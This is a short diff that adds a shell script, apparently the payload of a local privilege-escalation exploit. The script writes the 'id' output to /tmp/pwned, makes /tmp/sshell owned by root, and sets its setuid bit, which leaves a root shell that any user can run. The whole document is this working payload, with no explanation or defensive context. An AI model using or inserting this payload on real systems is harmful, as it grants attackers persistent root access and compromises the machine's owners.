@@ -1,0 +1,4 @@
+#!/bin/sh
+/usr/bin/id >> /tmp/pwned
+/bin/chown root.root /tmp/sshell
+/bin/chmod 4755 /tmp/sshell
